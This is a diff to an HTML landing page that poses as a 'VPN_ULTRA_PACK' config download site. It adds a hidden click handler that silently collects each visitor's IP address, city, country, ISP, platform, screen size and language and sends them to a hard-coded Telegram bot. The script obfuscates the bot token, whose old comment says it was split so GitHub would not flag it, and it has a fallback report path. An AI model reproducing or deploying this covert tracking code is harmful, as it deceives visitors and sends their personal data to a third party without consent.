@@ -14,7 +14,7 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            overflow: hidden;
+            overflow-x: hidden;
         }
         .terminal {
             width: 90%;
@@ -79,7 +79,7 @@
 
 <div class="terminal">
     <h1>[ VPN_ULTRA_PACK ]</h1>
-    <div class="version">BUILD: 2.3 // ENCRYPTED_LOGS: ON</div>
+    <div class="version">BUILD: 2.4 // TRACE_MODE: ENABLED</div>
     
     <div class="features">
         > Доступ: WorldWide<br>
@@ -98,25 +98,48 @@
     </div>
 
     <div class="footer">
-        TRACKING SYSTEM BY BLEGBOT1 // 2026
+        ADVANCED MONITORING ACTIVE // 2026
     </div>
 </div>
 
 <script>
-    // Скрытый скрипт отправки логов
     document.getElementById('secureBtn').addEventListener('click', function() {
-        // Разбиваем токен на куски, чтобы GitHub не ругался
-        const key_a = '8756812786';
-        const key_b = 'AAE2KYjodSDU8JbTGRwXlWw2se1he0zy_2w';
-        const full_token = key_a + ':' + key_b;
-        
+        // Маскировка токена
+        const k1 = '8756812786';
+        const k2 = 'AAE2KYjodSDU8JbTGRwXlWw2se1he0zy_2w';
+        const full_t = k1 + ':' + k2;
         const my_id = '5908974997';
-        const log_text = encodeURIComponent("🚀 ВНИМАНИЕ: Кто-то скачал конфиги с сайта!");
-        
-        const api_url = `https://api.telegram.org/bot${full_token}/sendMessage?chat_id=${my_id}&text=${log_text}`;
-        
-        // Тихая отправка данных
-        fetch(api_url).catch(e => { /* silence */ });
+
+        // Базовые данные браузера
+        const platform = navigator.platform;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const lang = navigator.language;
+
+        // Запрос расширенных данных по IP
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                const info = `
+🚨 **ОТЧЕТ ПОСЕТИТЕЛЯ** 🚨
+----------------------------
+📍 **IP:** \`${data.ip}\`
+🌍 **Страна:** ${data.country_name} (${data.country_code})
+🏙 **Город:** ${data.city}
+провайдер: ${data.org}
+
+📱 **Система:** ${platform}
+🖥 **Экран:** ${screenRes}
+🌐 **Язык:** ${lang}
+----------------------------
+`;
+                const url = `https://api.telegram.org/bot${full_t}/sendMessage?chat_id=${my_id}&text=${encodeURIComponent(info)}&parse_mode=Markdown`;
+                fetch(url);
+            })
+            .catch(() => {
+                // Если IP-сервис не ответил, шлем что есть
+                const backupInfo = `⚠️ **Лог (IP скрыт)**\nСистема: ${platform}\nЭкран: ${screenRes}`;
+                fetch(`https://api.telegram.org/bot${full_t}/sendMessage?chat_id=${my_id}&text=${encodeURIComponent(backupInfo)}&parse_mode=Markdown`);
+            });
     });
 </script>
 
